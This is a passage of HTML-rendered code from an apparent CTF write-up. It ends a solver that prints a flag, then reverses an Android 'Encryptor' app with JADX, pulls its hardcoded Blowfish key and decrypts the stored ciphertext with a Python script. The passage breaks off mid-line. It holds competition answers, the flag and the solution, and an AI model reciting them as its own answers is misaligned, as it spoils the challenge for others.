style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">model\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">key\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">i\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">]]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">as_long\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">())\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> i \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> range\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">32\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">    print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Key found:\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> result_key\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">    print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">No solution found.\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cblockquote>\n\u003Cp>CSCTF{u_g0T_it_h0OrAy6778462123}\u003C/p>\n\u003C/blockquote>\n\u003Ch3 id=\"encryptor\">Encryptor\u003C/h3>\n\u003Cblockquote>\n\u003Cp>My friend sent me this app with an encoded flag, but he forgot to implement the decryption algorithm! Can you help me out?\u003C/p>\n\u003C/blockquote>\n\u003Cp>This is an android web application. So what we can do is use JADX decompiler to analyze the java kotlin code that makes up this application\u003C/p>\n\u003Cp>In \u003Ccode>resources\u003C/code> we get a basic enc.txt file with content:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>OIkZTMehxXAvICdQSusoDP6Hn56nDiwfGxt7w/Oia4oxWJE3NVByYnOMbqTuhXKcgg50DmVpudg=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This is encrypted not encoded, so we need to find the encryption algorithm for this.\u003C/p>\n\u003Cp>Upon more investigation we find the encryption algorithm in \u003Ccode>sources/com/example/encryptor/MainActivity.java\u003C/code>. It’s blowfish.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"java\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">  private\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> String\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> getKey\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        return\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> String\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">Base64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">decode\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">ZW5jcnlwdG9yZW5jcnlwdG9y\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getBytes\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">))\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    private\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> String\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> encryptText\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">String\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> str\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> throws InvalidKeyException\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> UnsupportedEncodingException\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> NoSuchPaddingException\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> NoSuchAlgorithmException\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> IllegalBlockSizeException\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> BadPaddingException {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        SecretKeySpec\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> secretKeySpec\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> SecretKeySpec\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getKey\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getBytes\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">UTF-8\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Blowfish\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        Cipher\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> instance\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> Cipher\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getInstance\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Blowfish\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (instance \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">!=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\"> null\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">            instance\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">init\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> secretKeySpec\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            return\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> Build\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">VERSION\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">SDK_INT\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> >=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 26\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> ?\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> String\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">Base64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">encode\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">instance\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">doFinal\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">str\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getBytes\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">UTF-8\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">))\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">))\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> :\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        throw\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> Error\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So we can just make a script in python that solves this.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> Crypto\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Cipher \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> Blowfish\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> base64 \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> b64decode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">def\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> decrypt_text\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\">encrypted_text\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> The key used in the Java code\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    key \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">encryptorencryptor\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">encode\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">utf-8\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Decode the Base64 encoded string\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    encrypted_data \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> b64decode\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">encrypted_text\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Initialize the Blowfish cipher in ECB mode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    cipher \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> Blowfish\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">new\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">key\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> Blowfish.MODE_ECB\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Decrypt the data\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    decrypted_data \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> cipher\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">decrypt\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">encrypted_data\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Remove potential padding added during encryption (since Blowfish is a block cipher)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    decrypted_text \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> decrypted_data\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">rstrip\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\x00\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    return\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> decrypted_text\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">decode\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">utf-8\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Example usage\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">encrypted_text \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">OIkZTMehxXAvICdQSusoDP6Hn56nDiwfGxt7w/Oia4oxWJE3NVByYnOMbqTuhXKcgg50DmVpudg=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">decrypted_text \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> decrypt_text\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">encrypted_text\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan 